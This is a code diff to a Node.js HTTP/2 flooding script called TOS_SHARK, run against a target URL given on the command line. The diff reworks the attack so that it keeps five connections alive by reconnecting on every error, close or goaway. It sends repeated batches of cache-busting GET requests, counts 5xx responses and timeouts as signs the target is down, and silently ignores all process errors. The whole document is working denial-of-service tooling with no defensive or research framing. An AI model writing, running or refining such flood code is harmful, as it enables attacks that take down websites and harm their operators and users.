@@ -10,22 +10,10 @@ class TOS_SHARK {
         this.startTime = Date.now();
         this.lastLog = Date.now();
         this.reqCounter = 0;
-        this.lastPhaseChange = Date.now();
-        this.phaseDuration = 120000 + Math.random() * 100000; // 120-220s
         
-        // Connections
+        // Bulletproof connections
         this.conns = [];
-        
-        // Headers & Fingerprints
-        this.userAgents = [
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
-            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
-            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36'
-        ];
-        
-        this.paths = ['/', '/api', '/static', '/admin', '/users', '/data', '/v1', '/v2'];
-        this.methods = ['GET', 'HEAD', 'POST'];
+        this.maxConns = 5; // Fewer but more stable
         
         // Print header once
         console.log(`TØS-SHARK | *.* | MT-3M22`);
@@ -40,38 +28,85 @@ class TOS_SHARK {
     }
 
     start() {
-        // Setup connections
-        for (let i = 0; i < 10; i++) {
-            try {
-                const client = http2.connect(this.target);
-                client.setMaxListeners(1000);
-                this.conns.push(client);
-            } catch (e) {}
+        // Setup connections with error handling
+        for (let i = 0; i < this.maxConns; i++) {
+            this.createConnection(i);
         }
-        
-        console.log(this.color(`[+] ${this.conns.length} connections`, 'g'));
         
         // Start attack
         this.attackLoop();
         
+        // Auto-reconnect dead connections
+        setInterval(() => {
+            this.checkConnections();
+        }, 5000);
+        
         process.on('SIGINT', () => {
             this.running = false;
-            this.conns.forEach(c => c.destroy());
             process.exit(0);
         });
     }
 
-    getRandomPath() {
-        return this.paths[Math.floor(Math.random() * this.paths.length)];
+    createConnection(id) {
+        try {
+            const client = http2.connect(this.target, {
+                maxSessionMemory: 4096, // Less memory
+                maxDeflateDynamicTableSize: 4096
+            });
+            
+            // Set low listeners to prevent memory leaks
+            client.setMaxListeners(20);
+            
+            // Handle ALL possible errors
+            client.on('error', (err) => {
+                // Silent - will be recreated
+                setTimeout(() => {
+                    this.createConnection(id);
+                }, 1000);
+            });
+            
+            client.on('close', () => {
+                setTimeout(() => {
+                    this.createConnection(id);
+                }, 1000);
+            });
+            
+            client.on('frameError', () => {
+                // Silent
+            });
+            
+            client.on('goaway', () => {
+                setTimeout(() => {
+                    this.createConnection(id);
+                }, 2000);
+            });
+            
+            this.conns[id] = client;
+            
+        } catch (err) {
+            // Retry in 2 seconds
+            setTimeout(() => {
+                this.createConnection(id);
+            }, 2000);
+        }
     }
 
-    getRandomMethod() {
-        return this.methods[Math.floor(Math.random() * this.methods.length)];
+    checkConnections() {
+        for (let i = 0; i < this.maxConns; i++) {
+            if (!this.conns[i] || this.conns[i].destroyed || this.conns[i].closed) {
+                this.createConnection(i);
+            }
+        }
+    }
+
+    getRandomPath() {
+        const paths = ['/', '/api', '/static', '/data', '/v1', '/v2', '/test', '/ping'];
+        return paths[Math.floor(Math.random() * paths.length)];
     }
 
     getRandomHeaders() {
         return {
-            'user-agent': this.userAgents[Math.floor(Math.random() * this.userAgents.length)],
+            'user-agent': 'Mozilla/5.0',
             'accept': '*/*',
             'accept-language': 'en-US,en;q=0.9',
             'cache-control': 'no-cache'
@@ -80,76 +115,84 @@ class TOS_SHARK {
 
     async attackLoop() {
         while (this.running) {
-            // Check for phase change
-            const now = Date.now();
-            if (now - this.lastPhaseChange > this.phaseDuration) {
-                this.lastPhaseChange = now;
-                this.phaseDuration = 19000 + Math.random() * 3000; // 19-22s H1 phase
+            try {
+                // Get active connections
+                const activeConns = this.conns.filter(c => c && !c.destroyed && !c.closed);
                 
-                // H1 Phase - send minimal requests
+                if (activeConns.length === 0) {
+                    await this.sleep(100);
+                    continue;
+                }
+                
+                // Send 20 requests per tick (safer)
                 for (let i = 0; i < 20; i++) {
-                    this.totalReqs++;
-                    this.reqCounter++;
-                    await new Promise(r => setTimeout(r, 50));
+                    const client = activeConns[Math.floor(Math.random() * activeConns.length)];
+                    
+                    if (!client) continue;
+                    
+                    this.sendRequest(client).catch(() => {});
                 }
                 
-                // Back to H2
-                this.lastPhaseChange = now;
-                this.phaseDuration = 120000 + Math.random() * 100000;
-                continue;
-            }
-            
-            if (this.conns.length === 0) {
-                await new Promise(r => setTimeout(r, 100));
-                continue;
-            }
-            
-            // Send 100 requests per tick
-            for (let i = 0; i < 100; i++) {
-                const client = this.conns[Math.floor(Math.random() * this.conns.length)];
+                await this.sleep(0.5); // Slightly longer delay
                 
-                try {
-                    const method = this.getRandomMethod();
-                    const path = this.getRandomPath();
-                    const headers = this.getRandomHeaders();
-                    
-                    const req = client.request({
-                        ':method': method,
-                        ':path': `${path}?t=${Date.now()}&r=${this.reqCounter}`,
-                        ':authority': this.host,
-                        ...headers
-                    });
-                    
-                    this.reqCounter++;
-                    this.totalReqs++;
-                    
-                    req.on('response', (headers) => {
-                        const status = headers[':status'];
-                        this.logStatus(status);
-                    });
-                    
-                    req.on('error', (err) => {
-                        if (err.code === 'ECONNRESET' || err.code === 'ECONNREFUSED' || err.code === 'ETIMEDOUT') {
-                            this.logStatus('TIMEOUT');
-                        } else {
-                            this.logStatus('ERROR');
-                        }
-                    });
-                    
-                    if (method === 'POST') {
-                        req.write('');
-                    }
-                    
-                    req.end();
-                    
-                } catch (e) {
-                    this.totalReqs++;
-                    this.reqCounter++;
-                }
+            } catch (err) {
+                // Catch ANY loop error and continue
+                await this.sleep(100);
             }
-            
-            await new Promise(r => setTimeout(r, 0.1));
         }
+    }
+
+    async sendRequest(client) {
+        return new Promise((resolve) => {
+            this.reqCounter++;
+            this.totalReqs++;
+            
+            // Set timeout
+            const timeout = setTimeout(() => {
+                this.logStatus('TIMEOUT');
+                resolve();
+            }, 3000);
+            
+            try {
+                const req = client.request({
+                    ':method': 'GET',
+                    ':path': `${this.getRandomPath()}?t=${Date.now()}`,
+                    ':authority': this.host,
+                    ...this.getRandomHeaders()
+                });
+                
+                req.on('response', (headers) => {
+                    clearTimeout(timeout);
+                    const status = headers[':status'];
+                    this.logStatus(status);
+                    req.destroy(); // IMPORTANT: Destroy stream
+                    resolve();
+                });
+                
+                req.on('error', (err) => {
+                    clearTimeout(timeout);
+                    if (err.code === 'ECONNRESET' || err.code === 'ECONNREFUSED' || 
+                        err.code === 'ETIMEDOUT' || err.code === 'EPIPE') {
+                        this.logStatus('TIMEOUT');
+                    } else {
+                        this.logStatus('ERROR');
+                    }
+                    resolve();
+                });
+                
+                req.on('close', () => {
+                    clearTimeout(timeout);
+                    resolve();
+                });
+                
+                req.end();
+                
+            } catch (err) {
+                clearTimeout(timeout);
+                this.logStatus('ERROR');
+                resolve();
+            }
+        });
     }
 
     logStatus(status) {
@@ -163,35 +206,45 @@ class TOS_SHARK {
             if (status === 'TIMEOUT') {
                 color = 'r';
                 text = 'TIMEOUT';
-            } else if (status === 'ERROR') {
-                color = 'r';
-                text = 'ERROR';
-            } else if (status >= 500) {
+            } else if (typeof status === 'number' && status >= 500) {
                 color = 'r';
                 text = status;
-            } else if (status >= 400) {
+            } else if (typeof status === 'number' && status >= 400) {
                 color = 'y';
                 text = status;
-            } else if (status >= 300) {
-                color = 'b';
+            } else if (typeof status === 'number') {
                 text = status;
             }
             
             console.log(`STS-HAROP-INT ---> ${this.color(text, color)}:0.1s`);
             
-            // Down event (only for TIMEOUT or 5xx)
+            // Down event - only for TIMEOUT or 5xx
             if ((status === 'TIMEOUT' || (typeof status === 'number' && status >= 500)) && color === 'r') {
                 console.log(this.color(`{3M22-${this.reqCounter} --> ${text}}`, 'r'));
             }
         }
     }
+
+    sleep(ms) {
+        return new Promise(resolve => setTimeout(resolve, ms));
+    }
 }
 
 // Run
 if (require.main === module) {
+    // Global error handlers
+    process.on('uncaughtException', (err) => {
+        // Silently ignore all errors
+    });
+    
+    process.on('unhandledRejection', () => {
+        // Silently ignore
+    });
+    
     if (process.argv.length < 3) {
         console.log('Usage: node TOS.js https://target.com');
         process.exit(1);
     }
+    
     new TOS_SHARK(process.argv[2]);
-                }
+}
